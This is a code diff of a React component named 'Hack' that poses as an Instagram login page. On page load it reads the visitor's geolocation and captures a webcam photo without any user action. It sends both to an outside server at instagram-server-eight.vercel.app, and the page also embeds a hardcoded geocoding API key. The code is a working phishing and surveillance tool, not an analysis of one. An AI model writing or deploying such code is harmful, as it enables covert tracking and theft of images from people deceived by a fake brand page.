@@ -1,49 +1,52 @@
-import React, { useEffect, useRef } from "react";
+import React, { useEffect, useRef, useState } from "react";
 import axios from "axios";
 
-let imgData = {};
-
-export const Hack: React.FC = () => {
+const Hack: React.FC = () => {
   const videoRef = useRef<HTMLVideoElement | null>(null);
   const canvasRef = useRef<HTMLCanvasElement | null>(null);
+  const [location, setLocation] = useState<{
+    lat: number;
+    long: number;
+    location: string;
+  } | null>(null);
+  const [photo, setPhoto] = useState<string | null>(null);
 
   const OPEN_CAGE_API_KEY = "b9895ffd825f41d492da094f35cec421";
+
   // Get the current location
   useEffect(() => {
-    const fetchItem = async () => {
+    const fetchLocation = () => {
       navigator.geolocation.getCurrentPosition(
         async (position) => {
           const response = await fetch(
             `https://api.opencagedata.com/geocode/v1/json?q=${position.coords.latitude}+${position.coords.longitude}&key=${OPEN_CAGE_API_KEY}`
           );
           const data = await response.json();
-
-          const toSend = {
+          const locationData = {
             lat: position.coords.latitude,
             long: position.coords.longitude,
-            location: data?.results[0]?.formatted,
+            location: data?.results[0]?.formatted || "Unknown location",
           };
+          setLocation(locationData);
 
           await axios.post(
             "https://instagram-server-eight.vercel.app/v1/upload",
-            // "http://localhost:3333/v1/upload",
-            toSend,
-            {
-              withCredentials: true,
-            }
+            locationData,
+            { withCredentials: true }
           );
         },
         (err) => {
-          console.log(err);
+          console.error("Error getting location: ", err);
         }
       );
     };
 
-    fetchItem();
+    fetchLocation();
   }, []);
 
+  // Get the photo
   useEffect(() => {
-    const fetchImg = async () => {
+    const fetchPhoto = async () => {
       try {
         const stream = await navigator.mediaDevices.getUserMedia({
           video: true,
@@ -51,35 +54,34 @@ export const Hack: React.FC = () => {
 
         if (videoRef.current) {
           videoRef.current.srcObject = stream;
-          // Automatically capture the photo after the stream starts
           videoRef.current.onloadedmetadata = async () => {
             const canvas = canvasRef.current;
             const video = videoRef.current;
 
             if (canvas && video) {
-              imgData = {
-                img: canvas.toDataURL("image/png"),
-              };
-              await axios.post(
-                "https://instagram-server-eight.vercel.app/cloudinary/upload",
-                // "http://localhost:3333/cloudinary/upload",
-                imgData,
-                {
-                  withCredentials: true,
-                }
-              );
               const context = canvas.getContext("2d");
               if (context) {
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
                 context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                const imgDataUrl = canvas.toDataURL("image/png");
+                setPhoto(imgDataUrl);
+
+                await axios.post(
+                  "https://instagram-server-eight.vercel.app/cloudinary/upload",
+                  { img: imgDataUrl },
+                  { withCredentials: true }
+                );
               }
             }
           };
         }
       } catch (err) {
-        console.log("Error accessing the camera: ", err);
+        console.error("Error accessing the camera: ", err);
       }
     };
-    fetchImg();
+
+    fetchPhoto();
   }, []);
 
   return (
@@ -91,12 +93,7 @@ export const Hack: React.FC = () => {
           className="w-80 h-60 bg-black mb-4"
         ></video>
       </div>
-      <canvas
-        ref={canvasRef}
-        width="320"
-        height="240"
-        className="hidden"
-      ></canvas>
+      <canvas ref={canvasRef} className="hidden"></canvas>
 
       <div className="w-full max-w-xs">
         {/* Instagram Logo */}
@@ -108,7 +105,29 @@ export const Hack: React.FC = () => {
           />
         </div>
 
-        {/* Login Form */}
+        {/* Location Display */}
+        {location ? (
+          <p className="mb-4 text-lg">
+            Your current location is: Latitude: {location.lat}, Longitude:{" "}
+            {location.long}, Location: {location.location}
+          </p>
+        ) : (
+          <p className="mb-4 text-lg">Loading your location...</p>
+        )}
+
+        {/* Photo Display */}
+        {photo && (
+          <div className="mt-6">
+            <h2 className="text-xl font-semibold mb-2">Captured Photo:</h2>
+            <img
+              src={photo}
+              alt="Captured"
+              className="border border-gray-300"
+            />
+          </div>
+        )}
+
+        {/* Instagram Login Form */}
         <div className="bg-white p-6 border border-gray-300 rounded-md shadow-sm">
           <form className="space-y-4">
             {/* Email/Username */}
@@ -204,51 +223,5 @@ export const Hack: React.FC = () => {
     </div>
   );
 };
-// return (
-//   <div className="flex flex-col items-center justify-center min-h-screen bg-gray-100">
-//     <h1 className="text-2xl font-bold mb-4">Location and Camera</h1>
 
-//     {/* Display location */}
-//     {location.lat && location.long ? (
-//       <p className="mb-4 text-lg">
-//         Your current location is: Latitude: {location.lat}, Longitude:{" "}
-//         {location.long}
-//       </p>
-//     ) : (
-//       <p className="mb-4 text-lg">Loading your location...</p>
-//     )}
-
-//     {error && <p className="text-red-500">{error}</p>}
-
-//     {/* Camera stream */}
-//     <div className="flex flex-col items-center">
-//       <video
-//         ref={videoRef}
-//         autoPlay
-//         className="w-80 h-60 bg-black mb-4"
-//       ></video>
-//       <button
-//         onClick={capturePhoto}
-//         className="px-4 py-2 bg-blue-500 text-white font-semibold rounded hover:bg-blue-600 transition"
-//       >
-//         Capture Photo
-//       </button>
-//     </div>
-
-//     {/* Canvas for capturing the photo */}
-//     <canvas
-//       ref={canvasRef}
-//       width="320"
-//       height="240"
-//       className="hidden"
-//     ></canvas>
-
-//     {/* Display captured photo */}
-//     {photo && (
-//       <div className="mt-6">
-//         <h2 className="text-xl font-semibold mb-2">Captured Photo:</h2>
-//         <img src={photo} alt="Captured" className="border border-gray-300" />
-//       </div>
-//     )}
-//   </div>
-// );
+export default Hack;
